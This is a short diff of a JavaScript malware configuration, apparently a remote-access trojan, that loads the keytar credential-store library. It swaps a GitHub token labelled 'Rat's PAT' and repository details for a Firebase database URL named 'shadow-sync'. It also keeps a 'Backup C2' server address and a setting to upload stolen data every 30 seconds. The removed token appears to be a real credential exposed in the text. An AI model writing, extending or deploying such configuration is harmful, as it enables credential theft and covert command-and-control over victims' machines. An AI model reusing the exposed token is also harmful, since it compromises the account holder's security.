@@ -27,11 +27,8 @@ try { keytar = require("keytar"); } catch (e) {}
 // CONFIGURATION
 // ============================================
 const CONFIG = {
-  github: {
-    token: "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", // Rat's PAT (replace with real)
-    owner: "freshman21445",
-    repo: "AbGenius",
-    dataFolder: "data",
+  firebase: {
+    databaseURL: "https://shadow-sync-3aee0-default-rtdb.firebaseio.com/",
   },
   c2Server: "http://192.168.1.47:8080", // Backup C2
   uploadIntervalSeconds: 30,          // Send data once per 30s
